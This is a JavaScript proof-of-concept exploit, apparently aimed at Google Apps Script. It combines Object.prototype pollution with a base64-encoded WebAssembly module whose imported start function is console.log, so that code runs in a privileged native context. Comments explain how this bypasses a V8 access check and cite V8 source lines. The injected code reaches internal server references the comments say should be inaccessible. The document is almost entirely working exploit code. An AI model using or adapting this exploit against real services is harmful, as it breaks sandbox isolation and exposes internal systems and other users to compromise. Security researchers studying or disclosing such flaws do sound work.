let ctx = null
const proto = Object.getPrototypeOf({})
proto.call_beanserver_ref_ = function() {
  delete proto.call_beanserver_ref_;
  ctx = this 
}

console.log('a')
const remote_object_ref_id_ = ctx.remote_object_ref_id_;
const remote_object_server_id_ = ctx.remote_object_server_id_;
// ^^ The above is not required, using to build internal "log" fn below.

proto.call_beanserver_ref_ = function() {
  const js = `
    const remote_object_ref_id_ = '${remote_object_ref_id_}';
    const remote_object_server_id_ = '${remote_object_server_id_}';
    function log(...args) { call_beanserver_ref_(remote_object_server_id_, remote_object_ref_id_, 'log', node_util_.format(...args)) }

    log(call_beanserver_ref_) // We should not be able to access this.
    log(this) // We should not be able to access this.
  `;

  console.log.constructor(js)()
}

async function myFunction() {
  try { 
    console.log.constructor()
    // From what I can tell, this throws a V8 kNoAccess (see error logged below).
    // By polluting call_beanserver_ref_ and subsequently using console.log as a WASM start function,
    // we are able to bypass the context checking and execute code in console.log native context.

    // https://github.com/v8/v8/blob/f572c733dc62593c4d2234c2b81d5b8029cc6dfe/src/wasm/module-instantiate.cc#L1461 <== never sets the correct context, since its imported. V8 assumes Blink?
    // https://github.com/v8/v8/blob/f572c733dc62593c4d2234c2b81d5b8029cc6dfe/src/wasm/module-instantiate.cc#L1572 <== enter the start function native context (usually correctly set, except if imported)
  } catch (e) { 
    Logger.log(
      e.stack
    ) 
  }

  const bytes = new Uint8Array(Utilities.base64Decode('AGFzbQEAAAABBAFgAAACCQECanMCZm4AAAgBAA=='));
  await WebAssembly.instantiate(bytes, { js: { fn: console.log } }); // WASM start function bypasses isolate.
}